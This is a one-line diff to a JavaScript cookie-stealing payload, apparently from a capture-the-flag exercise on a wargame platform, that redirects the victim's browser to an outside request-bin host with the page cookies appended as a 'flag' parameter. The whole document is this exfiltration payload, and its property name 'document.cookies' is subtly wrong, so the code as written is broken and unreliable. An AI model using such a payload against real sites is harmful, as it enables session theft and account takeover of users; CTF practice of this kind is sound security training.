@@ -1,1 +1,1 @@
-location.href ='https://zaggxzn.request.dreamhack.games/'+document.cookies
+location.href ='https://zaggxzn.request.dreamhack.games/memo?flag='+document.cookies
